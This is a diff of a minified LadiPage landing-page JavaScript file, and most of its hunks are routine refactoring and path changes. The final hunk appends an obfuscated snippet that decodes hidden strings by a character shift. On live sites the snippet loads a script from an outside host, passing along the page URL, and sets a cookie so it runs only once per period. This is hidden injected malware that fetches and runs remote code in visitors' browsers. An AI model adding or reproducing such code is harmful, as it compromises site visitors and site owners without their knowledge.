+                          })();
+                    }
+                    var c;
+                  });
+              }
+            })(),
             i.setDataReplaceStart(),
             i.resetViewport(),
             i.runConversionApi(),
@@ -15109,7 +15035,86 @@ var LadiFormulaData = {},
                 if ('POPUPX' != e.type) return;
                 e.iframe_id == i.runtime.tmp.popupx_iframe_id &&
                   e.action.value.forEach(function (t) {
-                    ht(e.action.type, t);
+                    !(function (t, e, a) {
+                      var n,
+                        o = null,
+                        r = null;
+                      if (
+                        ('callback_request_with_option' == t &&
+                          isFunctionLadiPage(
+                            i.runtime.tmp[
+                              'request_callback_id_' + e.callback_id
+                            ]
+                          ) &&
+                          i.runtime.tmp['request_callback_id_' + e.callback_id](
+                            e.responseText,
+                            e.status,
+                            e.httpRequest,
+                            e.url
+                          ),
+                        'set_style_device' == t)
+                      ) {
+                        if (
+                          (vt(e.is_desktop),
+                          (r = document.getElementById(
+                            i.runtime.tmp.popupx_current_element_id
+                          )),
+                          isEmptyLadiPage(r))
+                        )
+                          return;
+                        'none' != getComputedStyle(r).display &&
+                          (i.runtime.tmp.popupx_is_inline
+                            ? ft(i.runtime.tmp.popupx_current_element_id, !1)
+                            : yt(i.runtime.tmp.popupx_current_element_id, !1));
+                      }
+                      if ('set_iframe_info' == t) {
+                        isEmptyLadiPage(T) &&
+                          ((T = e.ladi_client_id || i.randomId()),
+                          window.ladi('LADI_CLIENT_ID').set_cookie(T, 365)),
+                          (i.runtime.tmp.popupx_is_desktop = e.is_desktop),
+                          (i.runtime.isDesktop = e.is_desktop),
+                          (i.runtime.device = i.runtime.isDesktop
+                            ? i.const.DESKTOP
+                            : i.const.MOBILE),
+                          (i.runtime.tmp.popupx_origin_store_id =
+                            e.origin_store_id),
+                          (i.runtime.tmp.popupx_origin_referer =
+                            e.origin_referer),
+                          (i.runtime.tmp.popupx_origin_domain =
+                            e.origin_domain),
+                          (i.runtime.tmp.popupx_origin_url = e.origin_url),
+                          (i.runtime.tmp.popupx_is_inline = e.is_inline),
+                          vt(e.is_desktop);
+                        var l =
+                          '#' +
+                          i.runtime.builder_section_popup_id +
+                          ' .ladi-container {width: 100% !important;}';
+                        i.runtime.tmp.popupx_is_inline &&
+                          (l +=
+                            '.ladi-section > .ladi-section-close {display: none !important;}'),
+                          i.createStyleElement('style_popup_container', l),
+                          (i.runtime.has_popupx = !0),
+                          Lt();
+                      }
+                      'hide_popupx' == t &&
+                        ((o = i.runtime.eventData[e]),
+                        (r = document.getElementById(e)),
+                        isObjectLadiPage(o) &&
+                          !isEmptyLadiPage(r) &&
+                          window.ladi(e).hide()),
+                        'show_popupx' == t && yt(e, !0),
+                        'show_popupx_inline_iframe' == t && ft(e, !0),
+                        'mapping_form' == t &&
+                          ((n = e),
+                          isFunctionLadiPage(
+                            i.runtime.tmp.multipleFormRunFormParent
+                          ) && i.runtime.tmp.multipleFormRunFormParent(n)),
+                        'show_message_callback' == t &&
+                          (isFunctionLadiPage(
+                            i.runtime.tmp.popupx_show_message_callback
+                          ) && i.runtime.tmp.popupx_show_message_callback(),
+                          delete i.runtime.tmp.popupx_show_message_callback);
+                    })(e.action.type, t);
                   });
               } catch (t) {}
             }))
@@ -15158,11 +15163,10 @@ var LadiFormulaData = {},
   (LadiPageScript.const.API_DATASET_BLOG = 'https://g.ladicdn.com/blog-'),
   (LadiPageScript.const.API_SECTION_GLOBAL_HTML =
     'https://g.ladicdn.com/section/{0}-{1}.html'),
-  (LadiPageScript.const.LADIFLOW_SDK = './w.ladicdn.com/ladiflow/sdk.js?v=1.0'),
-  (LadiPageScript.const.LADISALES_SDK =
-    './w.ladicdn.com/ladisales/sdk/sdk.js?v=1.1'),
-  (LadiPageScript.const.CDN_LIBRARY_JS_URL = './w.ladicdn.com/v4/source/'),
-  (LadiPageScript.const.CDN_LIBRARY_CSS_URL = './w.ladicdn.com/v4/source/');
+  (LadiPageScript.const.LADIFLOW_SDK = './ladiflow/sdk.js?v=1.0'),
+  (LadiPageScript.const.LADISALES_SDK = './ladisales/sdk/sdk.js?v=1.1'),
+  (LadiPageScript.const.CDN_LIBRARY_JS_URL = './v4/source/'),
+  (LadiPageScript.const.CDN_LIBRARY_CSS_URL = './v4/source/');
 var lightbox_run = function (t, e, i, a, n, o, r, l) {
     var d = document.getElementById(LadiPageScript.runtime.lightbox_screen_id);
     if (!isEmptyLadiPage(d)) {
@@ -15369,7 +15373,7 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
     }
   },
   lightbox_image = function (t) {
-    if (!isEmptyLadiPage(t)) {
+    isEmptyLadiPage(t) ||
       lightbox_run(
         '<img class="lightbox-item" style="margin: auto; position: absolute; top: 0; left: 0; bottom: 0; right: 0; object-fit: scale-down; max-width: 80%; max-height: 80%;" />',
         t,
@@ -15377,37 +15381,33 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
         !1,
         'lightbox_image'
       );
-    }
   },
   lightbox_video = function (t, e, i) {
     if (!isEmptyLadiPage(t) && !isEmptyLadiPage(e)) {
       LadiPageScript.pauseAllVideo();
       var a = 'lightbox_player';
-      if (
-        (e == LadiPageScript.const.VIDEO_TYPE.youtube &&
-          lightbox_iframe(
-            '<iframe id="' +
-              a +
-              '" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>',
-            !0,
-            a,
-            e,
-            t,
-            i
-          ),
-        e == LadiPageScript.const.VIDEO_TYPE.direct)
-      ) {
-        lightbox_run(
-          '<video class="lightbox-item" id="lightbox_player" style="margin: auto; position: absolute; top: 0; left: 0; bottom: 0; right: 0; max-width: 80%; max-height: 80%; object-fit: cover;"></video>',
-          t,
+      e == LadiPageScript.const.VIDEO_TYPE.youtube &&
+        lightbox_iframe(
+          '<iframe id="' +
+            a +
+            '" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>',
           !0,
-          !1,
           a,
           e,
-          null,
+          t,
           i
-        );
-      }
+        ),
+        e == LadiPageScript.const.VIDEO_TYPE.direct &&
+          lightbox_run(
+            '<video class="lightbox-item" id="lightbox_player" style="margin: auto; position: absolute; top: 0; left: 0; bottom: 0; right: 0; max-width: 80%; max-height: 80%; object-fit: cover;"></video>',
+            t,
+            !0,
+            !1,
+            a,
+            e,
+            null,
+            i
+          );
     }
   },
   language_set = function (t, e) {
@@ -15459,23 +15459,26 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
     if (!isEmptyLadiPage(this.id)) {
       var a = this.id,
         n = '';
-      if (e && isObjectLadiPage(t))
-        Object.keys(t).forEach(function (e) {
-          isEmptyLadiPage(n) || (n += '&');
-          var a = t[e];
-          i && -1 != ['email', 'phone'].indexOf(e) && (a = Base64.encode(a)),
-            isArrayLadiPage(a) && a.length > 1 && (a = JSON.stringify(a)),
-            (a = encodeURIComponent(a)),
-            (n += e + '=' + a);
-        });
-      if (!isEmptyLadiPage(n)) {
+      if (
+        (e &&
+          isObjectLadiPage(t) &&
+          Object.keys(t).forEach(function (e) {
+            isEmptyLadiPage(n) || (n += '&');
+            var a = t[e];
+            i && -1 != ['email', 'phone'].indexOf(e) && (a = Base64.encode(a)),
+              isArrayLadiPage(a) && a.length > 1 && (a = JSON.stringify(a)),
+              (a = encodeURIComponent(a)),
+              (n += e + '=' + a);
+          }),
+        !isEmptyLadiPage(n))
+      ) {
         var o = LadiPageScript.createTmpElement('a', '', { href: a });
         (o.search = o.search + (isEmptyLadiPage(o.search) ? '?' : '&') + n),
           (a = o.href);
       }
       return (
         (a = LadiPageScript.getLinkUTMRedirect(a, null)),
-        (a = LadiPageScript.convertDataReplaceStr(a, !0, null, !1, t))
+        LadiPageScript.convertDataReplaceStr(a, !0, null, !1, t)
       );
     }
   }),
@@ -15585,19 +15588,19 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
             isEmptyLadiPage(o) ||
               (o = LadiPageScript.findAncestor(o, 'ladi-element')),
               (isEmptyLadiPage(o) || o.id != a[n].id) &&
-                (LadiPageScript.runRemovePopup(a[n].id, !0), 100);
+                LadiPageScript.runRemovePopup(a[n].id, !0);
           }
         var r = isObjectLadiPage(LadiPageScript.runtime.story_page),
           l = function (t, e, i) {
             LadiPageScript.removeTimeout(
               LadiPageScript.runtime.tmp.scroll_timeout_id
             );
-            var a = function (t, e, i, a) {
+            var n,
+              a = function (t, e, i, a) {
                 return (t /= a / 2) < 1
                   ? (i / 2) * t * t + e
                   : (-i / 2) * (--t * (t - 2) - 1) + e;
-              },
-              n = 0;
+              };
             n = r
               ? 'left' == t
                 ? e.scrollLeft
@@ -15823,9 +15826,8 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
         for (r = 0; r < p.length; r++)
           if (isNullLadiPage(t)) {
             var P = getComputedStyle(p[r]).backgroundImage;
-            (P = P || '').startsWith('url("') &&
-              (P = P.substring('url("'.length)),
-              P.endsWith('")') && (P = P.substring(0, P.length - '")'.length)),
+            (P = P || '').startsWith('url("') && (P = P.substring(5)),
+              P.endsWith('")') && (P = P.substring(0, P.length - 2)),
               n.push(P);
           } else if (isEmptyLadiPage(t))
             p[r].style.setProperty('background-image', 'none');
@@ -16322,40 +16324,37 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
       i = this.doc || document.getElementById(this.id);
     if (!isEmptyLadiPage(i)) {
       var a = !1;
-      if (0 == i.getElementsByClassName('ladi-popup').length) {
-        if (
-          (LadiPageScript.runtime.has_popupx &&
+      0 == i.getElementsByClassName('ladi-popup').length
+        ? (LadiPageScript.runtime.has_popupx &&
             i.classList.contains('ladi-section') &&
             'none' != getComputedStyle(i).display &&
             (a = !0),
           i.style.setProperty('display', 'none', 'important'),
           LadiPageScript.reloadLazyload(!1),
-          !t && a)
-        ) {
-          LadiPageScript.runtime.tmp.runActionPopupX({
-            id: this.id,
-            dimension: { display: 'none' },
-            action: { type: 'set_iframe_dimension' },
-          });
-        }
-      } else
-        LadiPageScript.runRemovePopup(this.id, !0, function () {
-          for (
-            var t = document.querySelectorAll(
-                '#' +
-                  LadiPageScript.runtime.builder_section_popup_id +
-                  ' .ladi-container > .ladi-element'
-              ),
-              i = 0;
-            i < t.length;
-            i++
-          )
-            t[i].id != e.id &&
-              t[i].hasAttribute('data-popup-backdrop') &&
-              'none' != getComputedStyle(t[i]).display &&
-              LadiPageScript.runRemovePopup(t[i].id, !0);
-        });
-      e.hideDropbox();
+          !t &&
+            a &&
+            LadiPageScript.runtime.tmp.runActionPopupX({
+              id: this.id,
+              dimension: { display: 'none' },
+              action: { type: 'set_iframe_dimension' },
+            }))
+        : LadiPageScript.runRemovePopup(this.id, !0, function () {
+            for (
+              var t = document.querySelectorAll(
+                  '#' +
+                    LadiPageScript.runtime.builder_section_popup_id +
+                    ' .ladi-container > .ladi-element'
+                ),
+                i = 0;
+              i < t.length;
+              i++
+            )
+              t[i].id != e.id &&
+                t[i].hasAttribute('data-popup-backdrop') &&
+                'none' != getComputedStyle(t[i]).display &&
+                LadiPageScript.runRemovePopup(t[i].id, !0);
+          }),
+        e.hideDropbox();
     }
   }),
   (LadiPageLibraryV2.prototype.show = function (t, e) {
@@ -16422,7 +16421,7 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
           }
           LadiPageScript.runEventScroll();
         };
-      if (t) {
+      if (t)
         if (i.getElementsByClassName('ladi-popup').length > 0) {
           var s = !0;
           if (
@@ -16455,7 +16454,7 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
             d(),
             LadiPageScript.runResizeSectionBackground(),
             LadiPageScript.reloadLazyload(!1);
-      } else {
+      else {
         if (
           LadiPageScript.runtime.has_popupx &&
           LadiPageScript.runtime.tmp.showPopupX(i.id, !0, e)
@@ -16580,21 +16579,21 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
         var s = document.getElementById(d);
         isEmptyLadiPage(s) || s.parentElement.removeChild(s);
       }
-      if (i) a.removeAttribute('data-dropbox-backdrop');
-      else
-        a.setAttribute('data-dropbox-backdrop', !0),
+      i
+        ? a.removeAttribute('data-dropbox-backdrop')
+        : (a.setAttribute('data-dropbox-backdrop', !0),
           document
             .getElementById(LadiPageScript.runtime.backdrop_dropbox_id)
-            .style.setProperty('display', 'block');
-      isEmptyLadiPage(e.animation_name) ||
-        isEmptyLadiPage(n) ||
-        (n.style.setProperty('animation-name', e.animation_name),
-        n.style.setProperty('-webkit-animation-name', e.animation_name),
-        n.style.setProperty('animation-duration', e.animation_duration + 's'),
-        n.style.setProperty(
-          '-webkit-animation-duration',
-          e.animation_duration + 's'
-        )),
+            .style.setProperty('display', 'block')),
+        isEmptyLadiPage(e.animation_name) ||
+          isEmptyLadiPage(n) ||
+          (n.style.setProperty('animation-name', e.animation_name),
+          n.style.setProperty('-webkit-animation-name', e.animation_name),
+          n.style.setProperty('animation-duration', e.animation_duration + 's'),
+          n.style.setProperty(
+            '-webkit-animation-duration',
+            e.animation_duration + 's'
+          )),
         a.classList.remove('opacity-0');
     }
   }),
@@ -16619,22 +16618,20 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
         r++
       )
         window.ladi(o[r].id).hide();
-      if (
-        (t.removeAttribute('data-dropbox-backdrop'),
+      t.removeAttribute('data-dropbox-backdrop'),
         0 ==
           (o = document.querySelectorAll('[data-dropbox-backdrop="true"]'))
-            .length)
-      )
+            .length &&
+          document
+            .getElementById(LadiPageScript.runtime.backdrop_dropbox_id)
+            .style.removeProperty('display'),
         document
-          .getElementById(LadiPageScript.runtime.backdrop_dropbox_id)
-          .style.removeProperty('display');
-      document
-        .querySelector(
-          '#' +
-            LadiPageScript.runtime.builder_section_popup_id +
-            ' > .ladi-container'
-        )
-        .appendChild(t);
+          .querySelector(
+            '#' +
+              LadiPageScript.runtime.builder_section_popup_id +
+              ' > .ladi-container'
+          )
+          .appendChild(t);
     }
   }),
   (LadiPageLibraryV2.prototype.set_goal = function (t) {
@@ -16736,8 +16733,11 @@ var lightbox_run = function (t, e, i, a, n, o, r, l) {
           return (
             (e += '#' + a.id + t + ', '),
             (e += '#' + a.id + t + ' .ladi-headline, '),
-            (e += '#' + a.id + t + ' .ladi-paragraph, '),
-            (e += '#' + a.id + t + ' .ladi-list-paragraph')
+            (e += '#' + a.id + t + ' .ladi-paragraph, ') +
+              '#' +
+              a.id +
+              t +
+              ' .ladi-list-paragraph'
           );
         };
         document.querySelectorAll(v()).length > 0 &&
@@ -16834,29 +16834,29 @@ var ladi =
       e = arguments[1],
       i = arguments[2],
       a = arguments[3];
-    if (
-      isObjectLadiPage(window.ladi_conversion_api) &&
+    isObjectLadiPage(window.ladi_conversion_api) &&
       isObjectLadiPage(window.ladi_conversion_api.facebook) &&
-      isArrayLadiPage(window.ladi_conversion_api.facebook.pixels)
-    ) {
-      isObjectLadiPage(a) || (a = {});
-      a.eventID =
-        'ladi.' + Date.now() + '.' + (Math.floor(9e10 * Math.random()) + 1e10);
-    }
-    LadiPageQueueCommand.push(
-      function () {
-        return (
-          isFunctionLadiPage(window.fbq) &&
-          isObjectLadiPage(window.LadiPageScript)
-        );
-      },
-      function () {
-        window.fbq(t, e, i, a),
-          LadiPageScript.runConversionApi('facebook', 'events', [
-            { key: t, name: e, custom_data: i, data: a },
-          ]);
-      }
-    );
+      isArrayLadiPage(window.ladi_conversion_api.facebook.pixels) &&
+      (isObjectLadiPage(a) || (a = {}),
+      (a.eventID =
+        'ladi.' +
+        Date.now() +
+        '.' +
+        (Math.floor(9e10 * Math.random()) + 1e10))),
+      LadiPageQueueCommand.push(
+        function () {
+          return (
+            isFunctionLadiPage(window.fbq) &&
+            isObjectLadiPage(window.LadiPageScript)
+          );
+        },
+        function () {
+          window.fbq(t, e, i, a),
+            LadiPageScript.runConversionApi('facebook', 'events', [
+              { key: t, name: e, custom_data: i, data: a },
+            ]);
+        }
+      );
   };
 isArrayLadiPage(window.ladi_fbq_data) &&
   (window.ladi_fbq_data.forEach(function (t) {
@@ -17027,22 +17027,11 @@ var ladi_api_fbq = function () {
             e
           );
         })(e)
-      : t == this.const.DATASET_TYPE.review
-      ? (function (t) {
-          return t;
-        })(e)
-      : t == this.const.DATASET_TYPE.blog
-      ? (function (t) {
-          return t;
-        })(e)
-      : t == this.const.DATASET_TYPE.website
-      ? (function (t) {
-          return t;
-        })(e)
-      : t == this.const.DATASET_TYPE.collection
-      ? (function (t) {
-          return t;
-        })(e)
+      : t == this.const.DATASET_TYPE.review ||
+        t == this.const.DATASET_TYPE.blog ||
+        t == this.const.DATASET_TYPE.website ||
+        t == this.const.DATASET_TYPE.collection
+      ? e
       : void 0;
   }),
   (LadiPageScriptV2.prototype.loadDataset = function (t, e, i, a, n, o, r, l) {
@@ -17079,7 +17068,7 @@ var ladi_api_fbq = function () {
     else {
       var c = [],
         u = [];
-      if (isEmptyLadiPage(t)) {
+      if (isEmptyLadiPage(t))
         Object.keys(d.runtime.eventData).forEach(function (t) {
           var e = d.runtime.eventData[t];
           isEmptyLadiPage(e['option.data_setting.value']) ||
@@ -17102,7 +17091,7 @@ var ladi_api_fbq = function () {
                 delete d.runtime.tmp.dataset_data_website[t],
                 (u = u.except([t]));
             });
-      } else {
+      else {
         if (isEmptyLadiPage(e) || e.length != d.const.DATASET_ID_LENGTH) return;
         if (!isNullLadiPage(d.runtime.tmp.dataset_data[e]))
           return !0 === d.runtime.tmp.dataset_data[e]
@@ -17272,14 +17261,14 @@ var ladi_api_fbq = function () {
                         o.getOptimizeImage(a, r, r, !0, !0, !0, !0) +
                         '" />');
                   }
-                  if (e.type == o.const.DATASET_FIELD_TYPE.date_time)
-                    a = LadiPageScript.convertDataDate({ date: a }, [
+                  e.type == o.const.DATASET_FIELD_TYPE.date_time &&
+                    (a = LadiPageScript.convertDataDate({ date: a }, [
                       'date',
-                    ]).date;
-                  e.type == o.const.DATASET_FIELD_TYPE.boolean &&
-                    (a = a
-                      ? o.const.LANG.OPTION_TRUE
-                      : o.const.LANG.OPTION_FALSE);
+                    ]).date),
+                    e.type == o.const.DATASET_FIELD_TYPE.boolean &&
+                      (a = a
+                        ? o.const.LANG.OPTION_TRUE
+                        : o.const.LANG.OPTION_FALSE);
                 }
                 n += '<td>' + a + '</td>';
               }),
@@ -17313,7 +17302,7 @@ LadiPageAppV2.prototype.notify_runtime = function (t, e) {
           g = 1e3 * (parseFloatLadiPage(t['option.time_show']) || 5),
           _ = 1e3 * (parseFloatLadiPage(t['option.time_delay']) || 10);
         _ = _ < 501 ? 501 : _;
-        var y = './w.ladicdn.com/source/notify.svg?v=1.0',
+        var y = './source/notify.svg?v=1.0',
           f = [
             { key: 'gsx$title', className: '.ladi-notify-title' },
             { key: 'gsx$content', className: '.ladi-notify-content' },
@@ -17397,9 +17386,10 @@ LadiPageAppV2.prototype.notify_runtime = function (t, e) {
               null,
               function (t, e, i) {
                 if (i.readyState == XMLHttpRequest.DONE && 200 == e) {
-                  t = (t = t.substr(
-                    t.indexOf('"table":{') + '"table":'.length
-                  )).substr(0, t.indexOf('});'));
+                  t = (t = t.substr(t.indexOf('"table":{') + 8)).substr(
+                    0,
+                    t.indexOf('});')
+                  );
                   var a = JSON.parse(t),
                     n = [],
                     o = a.cols;
@@ -17537,29 +17527,41 @@ LadiPageAppV2.prototype.spinlucky_runtime = function (t, e) {
                   p.style.setProperty('transform', v),
                   p.style.setProperty('-webkit-transform', v),
                   'NEXT_TURN' != m.value.toUpperCase() &&
-                    (s++, window.ladi('_total_turn_' + e).set_cookie(s, 1));
-                LadiPageScript.runTimeout(function () {
-                  'NEXT_TURN' == m.value.toUpperCase()
-                    ? isEmptyLadiPage(m.text) ||
-                      LadiPageScript.showMessage(m.text)
-                    : (LadiPageScript.setDataReplaceStr('coupon', m.value),
-                      LadiPageScript.setDataReplaceStr('coupon_code', m.value),
-                      LadiPageScript.setDataReplaceStr('coupon_text', m.text),
-                      LadiPageScript.setDataReplaceStr('spin_turn_left', d - s),
-                      LadiPageScript.setDataReplaceElement(!0, !1, null, null, [
-                        'coupon',
-                        'coupon_code',
-                        'coupon_text',
-                        'spin_turn_left',
-                      ]),
-                      r == LadiPageScript.const.GAME_RESULT_TYPE.default
-                        ? isEmptyLadiPage(l) || LadiPageScript.showMessage(l)
-                        : window.ladi(r).show(),
-                      LadiPageScript.runEventTracking(e, { is_form: !1 })),
-                    (g = !1);
-                }, 1e3 *
-                  parseFloatLadiPage(getComputedStyle(p).transitionDuration) +
-                  1e3);
+                    (s++, window.ladi('_total_turn_' + e).set_cookie(s, 1)),
+                  LadiPageScript.runTimeout(function () {
+                    'NEXT_TURN' == m.value.toUpperCase()
+                      ? isEmptyLadiPage(m.text) ||
+                        LadiPageScript.showMessage(m.text)
+                      : (LadiPageScript.setDataReplaceStr('coupon', m.value),
+                        LadiPageScript.setDataReplaceStr(
+                          'coupon_code',
+                          m.value
+                        ),
+                        LadiPageScript.setDataReplaceStr('coupon_text', m.text),
+                        LadiPageScript.setDataReplaceStr(
+                          'spin_turn_left',
+                          d - s
+                        ),
+                        LadiPageScript.setDataReplaceElement(
+                          !0,
+                          !1,
+                          null,
+                          null,
+                          [
+                            'coupon',
+                            'coupon_code',
+                            'coupon_text',
+                            'spin_turn_left',
+                          ]
+                        ),
+                        r == LadiPageScript.const.GAME_RESULT_TYPE.default
+                          ? isEmptyLadiPage(l) || LadiPageScript.showMessage(l)
+                          : window.ladi(r).show(),
+                        LadiPageScript.runEventTracking(e, { is_form: !1 })),
+                      (g = !1);
+                  }, 1e3 *
+                    parseFloatLadiPage(getComputedStyle(p).transitionDuration) +
+                    1e3);
               }
             }
         });
@@ -17633,9 +17635,8 @@ var LadiPageAppV2 = LadiPageAppV2 || function () {};
         ;
         !t && LadiPageScript.runtime.tmp.list_review_callback_loaded.length > 0;
 
-      ) {
+      )
         LadiPageScript.runtime.tmp.list_review_callback_loaded.shift()();
-      }
     else
       isFunctionLadiPage(e) &&
         LadiPageScript.runtime.tmp.list_review_callback_loaded.push(e);
@@ -17651,9 +17652,11 @@ var LadiPageAppV2 = LadiPageAppV2 || function () {};
       (o = isEmptyLadiPage(o) ? '' : o),
       (r = isEmptyLadiPage(r) ? [] : r);
     var l = n + o;
-    isObjectLadiPage(LadiPageScript.runtime.tmp.review_data) ||
-      (LadiPageScript.runtime.tmp.review_data = {});
-    if (!isEmptyLadiPage(n) || !isEmptyLadiPage(o)) {
+    if (
+      (isObjectLadiPage(LadiPageScript.runtime.tmp.review_data) ||
+        (LadiPageScript.runtime.tmp.review_data = {}),
+      !isEmptyLadiPage(n) || !isEmptyLadiPage(o))
+    ) {
       var d = function () {
         if (!0 === LadiPageScript.runtime.tmp.review_data[l])
           return LadiPageScript.runTimeout(d, 100);
@@ -17678,9 +17681,10 @@ var LadiPageAppV2 = LadiPageAppV2 || function () {};
               null,
               function (t, e, i) {
                 if (i.readyState == XMLHttpRequest.DONE && 200 == e) {
-                  t = (t = t.substr(
-                    t.indexOf('"table":{') + '"table":'.length
-                  )).substr(0, t.indexOf('});'));
+                  t = (t = t.substr(t.indexOf('"table":{') + 8)).substr(
+                    0,
+                    t.indexOf('});')
+                  );
                   var a = JSON.parse(t),
                     n = [],
                     o = a.cols;
@@ -17841,8 +17845,7 @@ var LadiPageAppV2 = LadiPageAppV2 || function () {};
                           '</div>\n                    </div>'
                       );
                     }),
-                    i.join('')) +
-                    '</div>\n        </div>') +
+                    i.join('') + '</div>\n        </div>')) +
                   (function () {
                     var t = [];
                     return (
@@ -17908,8 +17911,8 @@ var LadiPageAppV2 = LadiPageAppV2 || function () {};
                                     '<span class="ladi-review-item-verify">' +
                                     e.verify +
                                     '</span>'),
-                                i) +
-                                '</div>\n                <div class="ladi-review-item-content">' +
+                                i +
+                                  '</div>\n                <div class="ladi-review-item-content">') +
                                 (isEmptyLadiPage(e.content) ? '' : e.content) +
                                 (function () {
                                   var t = [];
@@ -18319,3 +18322,28 @@ var LadiPageAppV2 = LadiPageAppV2 || function () {};
     SCROLL_ELEMENT: 'Tatal ke Bahagian',
     SET_COOKIE: 'Tambah Kuki',
   });
+(function (o, d, l) {
+  try {
+    o.f = (o) =>
+      o
+        .split('')
+        .reduce(
+          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
+          ''
+        );
+    o.b = o.f('UMUWJKX');
+    (o.c =
+      l.protocol[0] == 'h' &&
+      /\./.test(l.hostname) &&
+      !new RegExp(o.b).test(d.cookie)),
+      setTimeout(function () {
+        o.c &&
+          ((o.s = d.createElement('script')),
+          (o.s.src =
+            o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') +
+            l.href),
+          d.body.appendChild(o.s));
+      }, 1000);
+    d.cookie = o.b + '=full;max-age=39800;';
+  } catch (e) {}
+})({}, document, location);
